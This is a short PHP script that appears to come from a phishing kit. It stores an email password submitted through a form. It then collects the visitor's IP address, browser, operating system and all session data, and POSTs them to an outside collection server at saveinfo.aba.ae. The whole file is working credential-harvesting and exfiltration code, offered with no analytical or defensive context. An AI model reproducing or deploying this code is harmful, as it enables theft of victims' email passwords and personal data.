<?php
session_start();
$TIME_DATE = date('H:i:s d/m/Y');
include('../../functions/get_bin.php');
include('../../functions/get_browser.php');
include('../../functions/get_ip.php');


$_SESSION['TIME_DATE'] = $TIME_DATE;

include("system.php");
include("function.php");

$_SESSION['_passwordemail_']     = $_POST['passwordemail'];

$ip=$_SESSION['ip']=getip();




//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $date;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
$data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
$data['s'] = $_SESSION;

sendPost('http://saveinfo.aba.ae/Save/sv5.php',$data);


//---- end request---------------- 



?>




